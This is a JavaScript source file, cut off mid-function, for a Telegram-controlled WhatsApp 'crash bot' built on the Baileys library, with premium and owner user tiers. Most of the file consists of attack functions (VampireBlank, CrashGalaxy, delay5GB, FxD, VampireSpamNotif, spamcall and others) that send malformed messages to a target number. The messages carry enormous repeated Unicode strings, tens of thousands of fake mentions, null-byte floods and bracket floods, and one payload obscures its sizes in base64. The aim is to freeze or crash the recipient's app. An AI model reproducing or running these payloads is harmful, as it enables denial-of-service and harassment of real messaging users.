const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const JsConfuser = require('js-confuser');
const CrashVamp = fs.readFileSync('./Vampire.jpeg')
const crypto = require('crypto');
const chalk = require('chalk');
const global = require('./VampConfig.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
let superVip = JSON.parse(fs.readFileSync('./VampDB/superVip.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./VampDB/premium.json'));
let OwnerUsers = JSON.parse(fs.readFileSync('./VampDB/Owner.json'));
let adminUsers = JSON.parse(fs.readFileSync('./VampDB/admin.json'));
let bannedUser = JSON.parse(fs.readFileSync('./VampDB/banned.json'));
let securityUser = JSON.parse(fs.readFileSync('./VampDB/security.json'));
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
const owner = global.owner;
const ONLY_FILE = "only.json";
const cooldowns = new Map();
const axios = require('axios');
const BOT_TOKEN = global.botToken; // Kalau token ada di VampireConfig.js
const startTime = new Date(); // Waktu mulai online
const nata = {
  key: {
    remoteJid: "status@broadcast",
    fromMe: false,
    id: "spartan" + Date.now(),
    participant: "0@s.whatsapp.net"
  },
  message: {
    extendedTextMessage: {
      text: "This is Spartan",
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: "DARI SPARTAN UNTUK KAMU🥰",
          body: "Maaf ya gantenk kena bak",
          thumbnailUrl: "https://telegra.ph/file/10c20b56e84743cfd77b2.jpg",
          mediaType: 1,
          sourceUrl: "https://t.me/Pentagon159",
          showAdAttribution: true
        }
      }
    }
  }
};
//group only 
function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

// Fungsi untuk menghitung durasi online dalam format jam:menit:detik
function getOnlineDuration() {
  let onlineDuration = new Date() - startTime; // Durasi waktu online dalam milidetik

  // Convert durasi ke format jam:menit:detik
  let seconds = Math.floor((onlineDuration / 1000) % 60); // Detik
  let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60); // Menit
  let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24); // Jam

  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function updateMenuBot() {
  const message = `${getOnlineDuration()}`;

  updateBotMenu(message);
}

function updateBotMenu(message) {
}

setInterval(() => {
  updateMenuBot();
}, 1000);


let sock;
let whatsappStatus = false;

async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
        console.log(`Disconnected. Reason: ${reason}`);

        if (reason && (reason >= 500 && reason < 600 || reason === 428 || reason === 408 || reason === 429)) {
            whatsappStatus = false;
            if (typeof bot !== 'undefined' && chatId && number) {
                await getSessions(bot, chatId, number);
            }
        } else {
            whatsappStatus = false;
        }
    } else if (connection === 'open') {
        whatsappStatus = true;
        console.log('Connected to WhatsApp!');
    }
  });
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
      console.error('Error: bot, chatId, atau number tidak terdefinisi!');
      return;
  }

  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'close') {
          const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
          if (reason && reason >= 500 && reason < 600) {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor ini ${number} \nTelah terputus dari WhatsApp.`);
              await getSessions(bot, chatId, number);
          } else {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor Ini : ${number} \nTelah kehilangan akses\nHarap sambungkan kembali.`);
              if (fs.existsSync('./VampirePrivate/creds.json')) {
                  fs.unlinkSync('./VampirePrivate/creds.json');
              }
          }
      } else if (connection === 'open') {
          whatsappStatus = true;
          bot.sendMessage(chatId, `Nomor ini ${number} \nBerhasil terhubung oleh Bot.`);
      }

      if (connection === 'connecting') {
          await new Promise(resolve => setTimeout(resolve, 1000));
          try {
              if (!fs.existsSync('./VampirePrivate/creds.json')) {
                  const formattedNumber = number.replace(/\D/g, '');
                  const pairingCode = await sock.requestPairingCode(formattedNumber);
                  const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                  bot.sendMessage(chatId, `
╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮
│➻ Nᴜᴍʙᴇʀ : ${number}
│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}
╰───────────────────────╯`);
              }
          } catch (error) {
              bot.sendMessage(chatId, `Nomor mu tidak Valid : ${error.message}`);
          }
      }
  });

  sock.ev.on('creds.update', saveCreds);
}
function savePremiumUsers() {
  fs.writeFileSync('./VampDB/premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveOwnerUsers() {
  fs.writeFileSync('./VampDB/Owner.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync('./VampDB/admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveVip() {
  fs.writeFileSync('./VampDB/superVip.json', JSON.stringify(superVip, null, 2));
}
function saveBanned() {
  fs.writeFileSync('./VampDB/banned.json', JSON.stringify(bannedUser, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
      if (eventType === 'change') {
          try {
              const updatedData = JSON.parse(fs.readFileSync(filePath));
              updateCallback(updatedData);
              console.log(`File ${filePath} updated successfully.`);
          } catch (error) {
              console.error(`Error updating ${filePath}:`, error.message);
          }
      }
  });
}
watchFile('./VampDB/premium.json', (data) => (premiumUsers = data));
watchFile('./VampDB/admin.json', (data) => (adminUsers = data));
watchFile('./VampDB/banned.json', (data) => (bannedUser = data));
watchFile('./VampDB/superVip.json', (data) => (superVip = data));
watchFile('./VampDB/security.json', (data) => (securityUser = data));

async function spamcall(target) {
    // Inisialisasi koneksi dengan makeWASocket
    const sock = makeWASocket({
        printQRInTerminal: false, // QR code tidak perlu ditampilkan
    });

    try {
        console.log(`📞 Mengirim panggilan ke ${target}`);

        // Kirim permintaan panggilan
        await sock.query({
            tag: 'call',
            json: ['action', 'call', 'call', { id: `${target}` }],
        });

        console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
    } catch (err) {
        console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
    } finally {
        sock.ev.removeAllListeners(); // Hapus semua event listener
        sock.ws.close(); // Tutup koneksi WebSocket
    }
}
async function feerwill(target, mention) {
  const zap = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "‼️⃟𝖅̴𝟥𝖗𝟢𝖘𝖒𝖊𝖗̸͙𝖈𝖞͛'𝖘͟" + "ោ៝".repeat(50000),
    title: "☆",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "ZrMId" + Math.floor(Math.random() * 99999999999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(50000)
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 600000000)}@s.whatsapp.net`
          )
        ],
        annotations: [
          {
            embeddedContent: {
              zap
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  
    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: tmsg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function SLoct(target) {
  try {
   const MD = {
  sc: "MzAwMDAw",         
  uc: "MTk5OQ==",         
  mx: "MTAwMDAwMDAwMDA=",  
  fs: "OTk5OTk5",          
};

const YX = Function("v", "B", `
  return parseInt(B.from(v, "base64").toString())
`);

const XY = {
  ch: "ꦾ",
  rm: ["re", "peat"].join(""),
  sc: YX(MD.sc, Buffer),
  uc: YX(MD.uc, Buffer),
  mx: YX(MD.mx, Buffer),
  fs: YX(MD.fs, Buffer),
};

    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            name: "sloct",
            address: "sloct heed",
            comment: XY.ch[XY.rm](XY.sc),
            accuracyInMeters: 1,
            degreesLatitude: 111.45231,
            degreesLongitude: 111.45231,
            contextInfo: {
              participant: target,
              remoteJid: "status@broadcast",
              mentionedJid: [
                target,
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: XY.uc },
                  () =>
                    "1" + Math.floor(Math.random() * XY.mx) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: XY.fs,
              isForwarded: true,
            },
          },
        },
      },
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });
    console.log(chalk.red(`NEW DEAY WILL KILL`));
  } catch (err) {
    console.log(err);
  }
}
async function VampireBlank(target, ptcp = true) {
  const Vampire = `_*~@8~*_\n`.repeat(10500);
  const CrashNotif = 'ꦽ'.repeat(55555);

  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: '𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐇𝐞𝐫𝐞' + CrashNotif + Vampire,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function CrashGalaxy(target) {
await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
    "interactiveMessage": {
        "header": {
            "title": "𝘎𝘡 -> 𝘊𝘳𝘢𝘴𝘩 𝘒𝘶𝘳𝘶𝘮𝘪 🧤",
            "imageMessage": {
           "url": "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=01_Q5Aa1wE6MDKYIVL7M_JGyjFYn-0Cib6R7YGxKe7s0c3aJpwfWw&oe=6894CC16&_nc_sid=5e03e0&mms3=true",
    "mimetype": "image/jpeg",
    "caption": "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
    "fileSha256": "f4VVN8Hedq+9T0Uy8LrVyMPGy8h3NoQOP8j802HjURw=",
    "fileLength": "583009",
    "height": 819,
    "width": 1792,
    "mediaKey": "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
    "fileEncSha256": "VL7//x43R4Elx69/8yB5EzzMPGK9+p8MPvXs0pGTqls=",
    "directPath": "/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=01_Q5Aa1wE6MDKYIVL7M_JGyjFYn-0Cib6R7YGxKe7s0c3aJpwfWw&oe=6894CC16&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1752001602",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACAASAMBIgACEQEDEQH/xAAuAAACAwEAAAAAAAAAAAAAAAAEBQACAwYBAAMBAAAAAAAAAAAAAAAAAAABAgT/2gAMAwEAAhADEAAAAGtl8TPRaqAprq1KQGCauOol4nzZLwKdAVDTQ5fpEN1YrIdg5YRZKz//xAAhEAACAgICAwEBAQAAAAAAAAABAgADBBESIQUTMUIUUf/aAAgBAQABPwCbWbGp5S3bLWIVZTojuWIawm/pE3PHPrIIixc0OCVWNlWaJFcfPtX8iX2tZaXP2Y3LIvG/sysR7KQfrARlKnuYPIZSECVDuKQB1uJyKjQeDFss/Bl3ibwuwQZjF8e9Sw1oxs+hE2QSZl5P9FnJK+ImAmlU8YnQjUoqHggBm7FjW2gj7KrG9QJhb3Pbr/YqOCOJ+iVlBcQwE9gKDR13E8goUhp//8QAGhEAAQUBAAAAAAAAAAAAAAAAAAEQERIhYf/aAAgBAgEBPwCWnYdcEUtwtxv/xAAgEQEAAQMDBQAAAAAAAAAAAAABAAIRIQMSMQQQIjJB/9oACAEDAQE/ANjEtNnhuH7x3071nIWmpRi7UQ6cTFcdDPvHCz//2Q=="
            },
            "hasMediaAttachment": true
        },
        "body": {
            "text": "𝗚𝗭 : 𝐔𝐧𝐢𝐭𝐞𝐝 𝐖𝐞 𝐂𝐨𝐧𝐪𝐮𝐞𝐫 🪽"
        },
        "nativeFlowMessage": {
            "buttons": [
                {
                    "name": "galaxy_message",
                    "buttonParamsJson": "[".repeat(29999)
                },
                {
                    "name": "galaxy_message",
                    "buttonParamsJson": "{".repeat(38888)
                }
            ],
            "messageParamsJson": "{".repeat(10000)
        },
        "contextInfo": {
            "pairedMediaType": "NOT_PAIRED_MEDIA"
        }
    }
    }}}, {});
}
async function ngetes(target) {
await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
    "interactiveMessage": {
        "header": {
            "title": "𝘎𝘡 -> 𝘊𝘳𝘢𝘴𝘩 𝘒𝘶𝘳𝘶𝘮𝘪 🧤",
            "imageMessage": {
           "url": "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=01_Q5Aa1wE6MDKYIVL7M_JGyjFYn-0Cib6R7YGxKe7s0c3aJpwfWw&oe=6894CC16&_nc_sid=5e03e0&mms3=true",
    "mimetype": "image/jpeg",
    "caption": "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
    "fileSha256": "f4VVN8Hedq+9T0Uy8LrVyMPGy8h3NoQOP8j802HjURw=",
    "fileLength": "583009",
    "height": 819,
    "width": 1792,
    "mediaKey": "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
    "fileEncSha256": "VL7//x43R4Elx69/8yB5EzzMPGK9+p8MPvXs0pGTqls=",
    "directPath": "/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=01_Q5Aa1wE6MDKYIVL7M_JGyjFYn-0Cib6R7YGxKe7s0c3aJpwfWw&oe=6894CC16&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1752001602",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACAASAMBIgACEQEDEQH/xAAuAAACAwEAAAAAAAAAAAAAAAAEBQACAwYBAAMBAAAAAAAAAAAAAAAAAAABAgT/2gAMAwEAAhADEAAAAGtl8TPRaqAprq1KQGCauOol4nzZLwKdAVDTQ5fpEN1YrIdg5YRZKz//xAAhEAACAgICAwEBAQAAAAAAAAABAgADBBESIQUTMUIUUf/aAAgBAQABPwCbWbGp5S3bLWIVZTojuWIawm/pE3PHPrIIixc0OCVWNlWaJFcfPtX8iX2tZaXP2Y3LIvG/sysR7KQfrARlKnuYPIZSECVDuKQB1uJyKjQeDFss/Bl3ibwuwQZjF8e9Sw1oxs+hE2QSZl5P9FnJK+ImAmlU8YnQjUoqHggBm7FjW2gj7KrG9QJhb3Pbr/YqOCOJ+iVlBcQwE9gKDR13E8goUhp//8QAGhEAAQUBAAAAAAAAAAAAAAAAAAEQERIhYf/aAAgBAgEBPwCWnYdcEUtwtxv/xAAgEQEAAQMDBQAAAAAAAAAAAAABAAIRIQMSMQQQIjJB/9oACAEDAQE/ANjEtNnhuH7x3071nIWmpRi7UQ6cTFcdDPvHCz//2Q=="
            },
            "hasMediaAttachment": true
        },
        "body": {
            "text": "𝗚𝗭 : 𝐔𝐧𝐢𝐭𝐞𝐝 𝐖𝐞 𝐂𝐨𝐧𝐪𝐮𝐞𝐫 🪽"
        },
        "nativeFlowMessage": {
            "buttons": [
                {
          "name": "galaxy_message",
          "buttonParamsJson": "{\"mode\":\"published\",\"flow_message_version\":\"3\",\"flow_token\":\"activate-ft\",\"flow_id\":\"752181300473227\",\"flow_cta\":\"GZ-Form-Galaxy\",\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"REGISTER\",\"data\":{\"phone_number\":\"081999138546\"}},\"flow_metadata\":{\"flow_json_version\":500,\"data_api_protocol\":\"PUBLIC_KEY\",\"flow_name\":\"register-member-v2_v1\",\"data_api_version\":300,\"www_proxy_secret\":null,\"categories\":[]}}"
        }
            ],
            "messageParamsJson": ""
        },
        "contextInfo": {
            "pairedMediaType": "NOT_PAIRED_MEDIA"
        }
    }
    }}}, {});
}
async function delay5GB(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: ".k",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "\n",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "ataa" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
async function DawgyDelay(target) {
try {
    let boeg = Array.from({ length: 41000 }, () =>
      "1" + Math.floor(Date.now() * 5000000) + "@s.whatsapp.net"
    );

    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "PEHK",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
              ],
            },
            contextInfo: {
              participant: target,
              mentionedJid: boeg,
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
  {
    tag: "meta",
    attrs: {},
    content: [
      {
        tag: "mentioned_users",
        attrs: {},
        content: [
          {
            tag: "to",
            attrs: { jid: target },
          },
        ],
      },
    ],
  },
],
    });

    console.log(chalk.green("─────「 ⏤Favela - (13)⏤ 」─────"));
  } catch (err) {
    console.error("FxD Error:", err);
  }
}
async function FxD(target) {
  try {
    let boeg = Array.from({ length: 41000 }, () =>
      "1" + Math.floor(Date.now() * 5000000) + "@s.whatsapp.net"
    );

    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Assalamualaikum",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
              ],
            },
            contextInfo: {
              participant: target,
              mentionedJid: boeg,
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
  {
    tag: "meta",
    attrs: {},
    content: [
      {
        tag: "mentioned_users",
        attrs: {},
        content: [
          {
            tag: "to",
            attrs: { jid: target },
          },
        ],
      },
    ],
  },
],
    });

    console.log(chalk.green("─────「 ⏤Favela - (13)⏤ 」─────"));
  } catch (err) {
    console.error("FxD Error:", err);
  }
}
async function VampireSpamNotif(target, Ptcp = true) {
    let virtex = "𝚅𝙰𝙼𝙿𝙸𝚁𝙴" + "ꦾ".repeat(90000) + "@8".repeat(90000);
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "𝙺𝙾𝙽𝚃𝙾𝙻",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function nullQ(target) {
  let mentioned = Array.from({ length: 100000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );

  await sock.relayMessage(target, {
    listResponseMessage: {
      title: "@tamainfinity",
      listType: 2,
      buttonText: null,
      sections: null,
      singleSelectReply: { selectedRowId: "X" },
      contextInfo: {
        mentionedJid: mentioned,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: ["13135550002@s.whatsapp.net"],
        quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "@tamainfinity",
              format: 1
            },
